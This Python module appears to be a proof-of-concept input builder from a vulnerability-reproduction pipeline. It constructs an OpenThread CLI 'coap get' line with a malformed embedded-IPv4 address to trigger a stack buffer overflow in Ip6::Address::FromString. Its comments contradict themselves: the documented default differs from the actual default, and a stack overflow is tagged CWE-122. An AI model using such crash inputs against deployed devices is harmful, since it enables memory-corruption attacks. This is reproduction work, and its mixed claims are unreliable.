"""CG-25（arvo:14821 / OpenThread）CLI IPv6 地址构造器。

**缺陷**：ot::Ip6::Address::FromString() 解析"内嵌 IPv4"地址时，遇到 '.' 只做
endp -= kIp4AddressSize(4)，却没有校验 dst 是否已越过 endp；随后 IPv4 段循环里
*dst++ = val 也不检查边界（patch 才补上 VerifyOrExit(dst <= endp, ...)）。
于是 IPv4 段多于 4 段（如 1.2.3.4.5）时，第 5 次写落在 mFields.m8+16，
即 16 字节地址之后 1 字节 —— stack-buffer-overflow，WRITE of size 1。

官方栈：FromString ip6_address.cpp:333 <- Cli::Coap::ProcessRequest cli_coap.cpp:180
<- Interpreter::ProcessLine <- Uart::ProcessCommand <- LLVMFuzzerTestOneInput。

**输入形态**：CLI UART 文本，命令 coap get <addr> <uri>，行尾要有换行，
CLI 才会在 Uart::ProcessCommand() 里处理这一行。
"""
from __future__ import annotations

FIELDS = {
    "addr": "str, 目标 IPv6 地址文本（默认 ::1.2.3.4.5）",
    "verb": "str, coap 动词 get/post/put/delete（默认 get）",
    "uri": "str, CoAP URI（默认 /a）",
    "newline": "str, 行尾字符（默认 换行；CLI 靠它触发 ProcessCommand）",
}

DEFAULT_ADDR = "::1:2:3:4:5:6:7:1.2.3.4"   # 实测命中：7 段 + :: + 内嵌 IPv4，压缩移位时 endp 越过缓冲区下界

DECLARED_SINK = {
    "file": "src/core/net/ip6_address.cpp",
    "line": 333,
    "symbol": "FromString",
    "note": "内嵌 IPv4 段多于 4 段时 *dst++ 写到 mFields.m8+16（16 字节后 1 字节）",
}


class OtIp6Result:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "ot_ip6"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> OtIp6Result:
    fields = dict(fields or {})
    addr = str(fields.get("addr") or DEFAULT_ADDR)
    verb = str(fields.get("verb") or "get")
    if verb not in ("get", "post", "put", "delete"):
        return OtIp6Result(False, reason="verb 只认 get/post/put/delete: %s" % verb)
    uri = str(fields.get("uri") or "/a")
    nl = fields.get("newline")
    nl = "\n" if nl is None else str(nl)
    if "." not in addr:
        return OtIp6Result(False, reason="addr 必须含内嵌 IPv4（要有 .），否则走不到该分支")
    line = "coap " + verb + " " + addr + " " + uri + nl
    used = {"addr": addr, "verb": verb, "uri": uri, "newline": bool(nl),
            "ipv4_parts": addr.count(".") + 1, "bytes": len(line)}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "ot_ip6 构造器不识别该字段"}
               for k in fields if k not in known]
    return OtIp6Result(True, line.encode(), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：FromString 内嵌 IPv4 段数不设上限，写到 16 字节之外。"""
    return {
        "claim_id": "cg25-ot-ip6-fromstring",
        "subject": "Ip6::Address::FromString",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/ot_ip6.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "ot_ip6"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.data.startswith(b"coap get ::1:2:3:4:5:6:7:1.2.3.4 ")
    assert r.data.endswith(b"\n")
    assert r.fields_used["ipv4_parts"] == 4      # 内嵌 IPv4 是 1.2.3.4（4 段）
    assert not build({"addr": "2001:db8::1"}).ok
    assert build({"addr": "::1:2:3:4:5:6:1.2.3.4"}).ok
    assert not build({"verb": "patch"}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "Ip6::Address::FromString" and c["sink"]["line"] == 333
    print("ot_ip6 builder self-check OK:", r.to_record())
